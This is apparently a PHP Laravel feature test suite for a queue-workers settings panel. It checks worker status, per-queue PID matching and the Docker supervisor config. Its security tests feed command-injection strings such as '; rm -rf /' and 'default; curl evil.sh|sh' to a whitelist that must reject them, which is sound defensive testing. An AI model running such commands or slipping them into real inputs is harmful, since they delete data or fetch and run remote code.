<?php

namespace Tests\Feature;

use App\Livewire\Definicoes;
use App\Services\System\QueueWorkers;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Livewire\Livewire;
use Tests\TestCase;

/**
 * The Workers panel in Settings: seeing whether each queue has a worker, whether
 * it is doing anything, and starting/stopping/restarting it.
 *
 * The queue name arrives from the browser and ends up on a command line, so the
 * whitelist is the part that carries the risk here.
 */
class QueueWorkersTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        // The suite runs on the `sync` queue, which has no jobs table to read —
        // point at the database connection so the counts are exercised at all.
        config(['queue.default' => 'database']);
    }

    private function workers(): QueueWorkers
    {
        return app(QueueWorkers::class);
    }

    /** No workers running, whatever this machine happens to be doing. */
    private const SEM_WORKERS = '';

    // ── the security boundary ────────────────────────────────────────────

    /**
     * Only names from config may reach a command line. Without this, a crafted
     * Livewire call would put arbitrary text into the string the shell runs.
     */
    public function test_a_queue_name_that_is_not_configured_is_refused(): void
    {
        $workers = $this->workers();

        foreach (['; rm -rf /', 'default; curl evil.sh|sh', '../../etc', 'nope', ''] as $mau) {
            $this->assertFalse($workers->isQueue($mau), "«{$mau}» must not be a managed queue");

            try {
                $workers->start($mau);
                $this->fail("start(«{$mau}») should have been refused");
            } catch (\RuntimeException $e) {
                $this->assertStringContainsString('Unknown queue', $e->getMessage());
            }
        }
    }

    public function test_the_configured_queues_are_accepted(): void
    {
        $workers = $this->workers();

        foreach (array_keys(config('contentmachine.workers.queues')) as $queue) {
            $this->assertTrue($workers->isQueue($queue));
        }
    }

    /** The component must not hand an unknown name to the service either. */
    public function test_the_panel_rejects_an_unknown_queue_without_erroring(): void
    {
        $this->comSessaoIniciada();
        Livewire::test(Definicoes::class)
            ->call('iniciarWorker', '; rm -rf /')
            ->assertHasNoErrors()
            ->assertDispatched('toast');
    }

    // ── what the panel reports ───────────────────────────────────────────

    public function test_status_covers_every_configured_queue(): void
    {
        $status = $this->workers()->status(self::SEM_WORKERS);

        $this->assertSame(array_keys(config('contentmachine.workers.queues')), array_keys($status));
        foreach ($status as $queue => $w) {
            $this->assertSame($queue, $w['queue']);
            $this->assertIsBool($w['running']);
            $this->assertIsInt($w['pending']);
        }
    }

    /**
     * Waiting work is counted per queue, and a job already picked up is reported
     * as in flight rather than as waiting — that difference is what tells you a
     * worker is stuck versus merely idle.
     */
    public function test_waiting_and_in_flight_jobs_are_counted_per_queue(): void
    {
        $this->enfileirar('media', reserved: false);
        $this->enfileirar('media', reserved: false);
        $this->enfileirar('previews', reserved: true);

        $status = $this->workers()->status(self::SEM_WORKERS);

        $this->assertSame(2, $status['media']['pending']);
        $this->assertSame(0, $status['media']['reserved']);
        $this->assertSame(0, $status['previews']['pending']);
        $this->assertSame(1, $status['previews']['reserved']);
        $this->assertSame(0, $status['default']['pending']);
    }

    /**
     * "Busy" must never be asserted for a queue with no worker. A reserved row
     * with nothing running is an ABANDONED job, not work in progress — reporting
     * it as busy would hide exactly the situation the panel exists to reveal.
     */
    public function test_a_queue_with_no_worker_is_never_reported_busy(): void
    {
        $this->enfileirar('media', reserved: true);

        $status = $this->workers()->status(self::SEM_WORKERS);

        $this->assertFalse($status['media']['running']);
        $this->assertNull($status['media']['busy'], 'no worker → busy is unknown, not true');
    }

    /** With a worker up, a reserved job reads as busy and an empty queue as free. */
    public function test_a_running_worker_reads_busy_with_work_and_free_without(): void
    {
        $tabela = ' 4242 php artisan queue:work --queue=media --tries=3 --timeout=1800';

        $livre = $this->workers()->status($tabela)['media'];
        $this->assertTrue($livre['running']);
        $this->assertFalse($livre['busy'], 'a worker with nothing to do is free');
        $this->assertSame([4242], $livre['pids']);

        $this->enfileirar('media', reserved: true);

        $ocupado = $this->workers()->status($tabela)['media'];
        $this->assertTrue($ocupado['busy'], 'a worker with a reserved job is busy');
    }

    /** A worker for one queue must not be mistaken for a worker for another. */
    public function test_pid_matching_is_per_queue_and_ignores_lookalikes(): void
    {
        $workers = $this->workers();
        $tabela = implode("\n", [
            ' 111 php artisan queue:work --queue=default --tries=3',
            ' 222 php artisan queue:work --queue=default-slow --tries=3',   // different queue
            ' 333 grep --queue=default',                                     // not a worker
            ' 444 php artisan queue:listen --queue=media',                   // not queue:work
            ' 555 php artisan queue:work --queue=media --tries=3',
        ]);

        $this->assertSame([111], $workers->pidsFor('default', $tabela));
        $this->assertSame([555], $workers->pidsFor('media', $tabela));
        $this->assertSame([], $workers->pidsFor('previews', $tabela));
    }

    /**
     * A worker may serve several queues at once — the container runs
     * `--queue=default,previews` as a single process. Matching the name straight
     * after `--queue=` reported `previews` as stopped on every Docker deploy while
     * a process was serving it perfectly well.
     */
    public function test_a_worker_serving_several_queues_counts_for_each_of_them(): void
    {
        $workers = $this->workers();
        $tabela = ' 900 php artisan queue:work --queue=default,previews --tries=3 --timeout=3300';

        $this->assertSame([900], $workers->pidsFor('default', $tabela));
        $this->assertSame([900], $workers->pidsFor('previews', $tabela));
        $this->assertSame([], $workers->pidsFor('media', $tabela), 'media is not in that list');

        $status = $workers->status($tabela);
        $this->assertTrue($status['default']['running']);
        $this->assertTrue($status['previews']['running']);
        $this->assertFalse($status['media']['running']);
    }

    /**
     * The container must serve EVERY queue the app dispatches to. `media` shipped
     * with no consumer at all, so a workshop render queued a job that was never
     * picked up — no error, no progress, waiting for ever. This fails the moment a
     * queue is added to config without a supervisor program to drain it.
     */
    public function test_the_docker_image_runs_a_worker_for_every_configured_queue(): void
    {
        $conf = file_get_contents(base_path('docker/supervisord.conf'));
        $this->assertIsString($conf);

        // Every queue named across all `queue:work` lines in the supervisor config.
        preg_match_all('/queue:work[^\n]*--queue=([\w,-]+)/', $conf, $m);
        $servidas = collect($m[1])->flatMap(fn ($v) => explode(',', $v))->unique()->all();

        foreach (array_keys(config('contentmachine.workers.queues')) as $queue) {
            $this->assertContains($queue, $servidas, "docker/supervisord.conf has no worker draining «{$queue}»");
        }

        // And the scheduler, or nothing time-based ever fires in the container.
        $this->assertStringContainsString('schedule:work', $conf);
    }

    public function test_the_settings_page_renders_the_workers_panel(): void
    {
        $this->comSessaoIniciada();
        Livewire::test(Definicoes::class)
            ->set('secao', 'workers')
            ->assertOk()
            ->assertSee('Workers das filas')
            ->assertSee('media');
    }

    // ── helpers ──────────────────────────────────────────────────────────

    private function enfileirar(string $queue, bool $reserved): void
    {
        DB::table('jobs')->insert([
            'queue' => $queue,
            'payload' => json_encode(['displayName' => 'Test']),
            'attempts' => 0,
            'reserved_at' => $reserved ? time() : null,
            'available_at' => time(),
            'created_at' => time(),
        ]);
    }
}
